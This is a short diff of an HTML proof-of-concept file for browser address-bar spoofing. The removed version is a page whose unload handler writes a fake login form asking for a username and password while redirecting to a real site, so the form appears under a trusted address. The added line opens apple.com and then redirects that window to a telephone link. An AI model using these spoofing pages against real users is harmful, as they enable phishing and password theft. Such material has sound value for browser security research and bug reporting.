@@ -1,25 +1,2 @@
 
-<!DOCTYPE HTML>
-<html lang="en-US">
-<head>
-	<meta charset="UTF-8">
-	<title>Omnibox spoofing</title>
-	<script>
-		window.onunload = function() {
-			document.write('<title>Fake website</title><br><br><center><h1>A fake website</h1><form method="post">Username: <input type="text" name="username" size="15"/><br/>Password: &nbsp;<input type="password" name="passwort" size="15"/><br/><div align="center"><p><input type="submit" value="Login"/></p></form></center>');
-			setInterval(function() {
-				location.href = "https://jigsaw.w3.org/HTTP/Basic";
-			}, 0);
-		}
-	</script>
-</head>
-
-<body>
-	<center>
-		<br>
-		<h1>Access any website using the omnibox</h1>
-	</center>
-  <input onclick="window.history.go(-1)">
-</body>
-
-</html>
+<input onclick="var x = window.open('https://www.apple.com/contact/');setTimeout(function(){x.location='tel:+2123239'}, 1000)" type="button" value="Click here" />
